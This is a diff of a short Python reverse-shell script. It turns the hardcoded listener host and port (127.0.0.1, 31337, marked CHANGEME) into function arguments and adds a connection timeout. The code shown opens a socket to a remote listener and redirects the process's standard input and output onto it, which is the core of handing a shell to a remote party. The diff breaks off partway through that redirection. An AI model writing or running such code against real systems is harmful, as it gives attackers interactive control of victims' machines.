@@ -3,11 +3,10 @@ import os
 import pty
 import socket
 
-lhost = "127.0.0.1" # XXX: CHANGEME
-lport = 31337 # XXX: CHANGEME
 
-def run():
+def run(lhost,lport):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(5)
     s.connect((lhost, lport))
     os.dup2(s.fileno(),0)
     os.dup2(s.fileno(),1)
